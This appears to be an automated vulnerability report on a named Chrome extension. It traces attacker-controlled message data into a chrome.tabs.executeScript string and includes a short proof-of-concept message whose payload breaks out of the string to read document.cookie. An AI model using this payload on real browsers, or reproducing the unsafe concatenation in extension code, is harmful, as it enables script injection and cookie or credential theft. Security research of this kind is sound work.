# CoCo Analysis: ogkljjjphijjpkhkbbeklflblpheooec

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: bg_chrome_runtime_MessageExternal → chrome_tabs_executeScript_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ogkljjjphijjpkhkbbeklflblpheooec/opgen_generated_files/bg.js
Line 990    if(request.sms){
Line 993        chrome.tabs.executeScript(null, {code:"\n\
            var list = document.getElementsByClassName('"+autocompleteHTMLElemClass+"');\n\
            var n;\n\
            for (n = 0; n < list.length; ++n) {\n\
                list[n].readonly='true';\n\
                list[n].value='" + request.sms + "';\n\
                list[n].readonly='false';\n\
            }\n\
        "});
```

**Code:**

```javascript
// Background script - External message listener (bg.js line 988)
chrome.runtime.onMessageExternal.addListener(function(request, sender, sendResponse) {
    if(request.sms){
        // DOM set new value to input
        chrome.tabs.executeScript(null, {code:"\n\
            var list = document.getElementsByClassName('"+autocompleteHTMLElemClass+"');\n\
            var n;\n\
            for (n = 0; n < list.length; ++n) {\n\
                list[n].readonly='true';\n\
                list[n].value='" + request.sms + "';\n\ // ← attacker-controlled
                list[n].readonly='false';\n\
            }\n\
        "});
    }
    return true;
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message from another extension (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// Malicious extension sends message to victim extension
chrome.runtime.sendMessage(
  'ogkljjjphijjpkhkbbeklflblpheooec',
  { sms: "'; alert(document.cookie); //" },
  function(response) {
    console.log('Exploit sent');
  }
);
```

**Impact:** Arbitrary code execution via executeScript. An attacker-controlled extension can inject malicious JavaScript into the active tab by exploiting string concatenation in the executeScript code parameter. The attacker can inject arbitrary JavaScript by breaking out of the string context with single quotes, allowing theft of cookies, credentials, or complete page DOM manipulation.
